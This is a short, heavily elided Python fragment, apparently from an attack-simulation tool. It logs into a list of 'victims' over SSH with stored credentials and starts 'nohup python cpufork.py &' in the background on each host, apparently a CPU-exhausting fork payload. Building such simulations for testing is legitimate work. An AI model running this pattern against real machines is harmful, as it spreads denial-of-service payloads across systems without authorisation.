...
#       selection=raw_input("Select which attack you wish to simulate\n")
                        ...
                        for row in victims:
                                ...
                                try:
                                        ...
                                        if not s.login(row[0],row[1],row[2]):
                                                ...
                                                s.sendline('nohup python cpufork.py &')
                                                s.prompt()
                                                s.logout()
